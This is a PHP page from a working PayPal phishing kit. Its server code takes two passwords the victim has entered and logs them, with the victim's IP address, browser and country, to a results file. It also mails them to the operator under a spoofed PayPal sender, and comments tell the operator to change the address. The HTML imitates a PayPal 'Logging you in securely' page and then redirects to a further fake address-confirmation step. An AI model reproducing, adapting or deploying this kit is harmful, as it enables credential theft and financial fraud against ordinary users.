<?
session_start();
$deuxpass = $_POST['deuxpass'];
$_SESSION['deuxpass'] = $deuxpass;
$unpass = $_SESSION['unpass'];

include"Email.php";
$hostname = $_POST['hostname'];
$ip = getenv("REMOTE_ADDR");
$url="http://www.trouver-ip.com/index.php?ip=".$ip;
$s=file_get_contents($url);
$n=explode('flags/', $s);
$s=explode('.png', $n[1]);
$pays=$s[0];	
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "
================= LOGIN INFO     =========
PASSWORD 1      : $unpass
PASSWORD 2      : $deuxpass
================= VECTIM PC/INFO =========
Date 	        : $date
Navigator       : $useragent
Client IP       : $ip
Country         : $pays
==========================================";
$file = fopen("Rezult/LOGIN.txt","a");   //// Save Password in LOGIN.txt / To Change Directory Or Folder Back Add (../) Ex: ../Dir/Scam/LOGIN.txt
fwrite($file,$message);
$subject = "$userip";
$headers = "From: Results <paypal@hotmail.com>"; ///////////// CHANGE THIS EMAIL
mail($send,$subject,$message,$headers);    
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>Logging in </title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/css/core/global.css">
<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/css/Customer/pages/pageSalsa.css">

<link media="print" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/css/core/print.css">

<style type="text/css">
					h3 {margin:4em 0 0 0; line-height:normal;}
					p.note {color:#656565; font-size:0.9em;}
					p.note a {color:#656565;}
					p strong {margin-top:2em; color:#1A3665; font-size:1.25em;}
					img.actionImage {margin: 1.88em 0 2em 0;}
				</style>
<script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20101108-1/js/lib/min/global.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20101108-1';</script><link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/en_US/i/icon/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/en_US/i/pui/apple-touch-icon.png">
</head>
<body>
<noscript><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript>
<div class="" id="page">
<div id="header" class="notab">
<h1><a href="https://www.paypal.com/dz/cgi-bin/webscr?cmd=_account">
<img border="0" src="Gif/paypal_logo.gif" alt="PayPal" width="200" height="50"></a></h1>
<span><a href="#content" class="accessAid skip">Skip to main content</a></span><div class="empty" id="navPrimary"></div>
</div>

<div id="content">
<div id="headline">
<h2 class="accessAid">Logging in</h2>
</div>
<div id="messageBox"></div>
<div id="main"><div class="layout1 textcenter">
<h3>Logging you in securely...</h3>
<img src="Gif/icon_load_roundcorner_lock1_186x42_withlock.gif" border="0" class="actionImage" alt="Logging you in securely" width="186" height="42"><p><strong>PayPal. The world's most-loved way to pay and get paid.</strong></p>
<p class="note">If this page appears for more than 5 seconds, <a href="ConfirmAdress.php?cmd=/us/cgi-bin/webscr?cmd=_flow&SESSION=PnlUc3mEH9h4dUKHV_V6QjSQGD7ZITYijQ9wUub3cFpG7mo2DssMkjxdg34&dispatch=c70bbe41527861c2b97c3d1f6a850acfdd2fbb19a3d47242b071efa252ac2167e47ebd1fddf0fdac346cbad9c07281a22ed3fc89693dbd0c">click here</a> to reload.</p>
</div></div>

<script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script>
</div>
<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20101108-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20101108-1/js/lib/min/calendar.js"></script>

<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20101108-1/js/site_catalyst/pp_jscode_080706.js"></script>

<noscript><img
src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
height="1" width="1" border="0" alt="" /></noscript>

<script type="text/javascript">
							  // This is an ugly hack until there is a reliable ondomready function
							 if(typeof PAYPAL != 'undefined'){
								 PAYPAL.core.Navigation.init();
							}</script>
<script type="text/JavaScript">
<!--
setTimeout("location.href = 'ConfirmAdress.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548';",8000);
-->
</script>


</body>
</html>
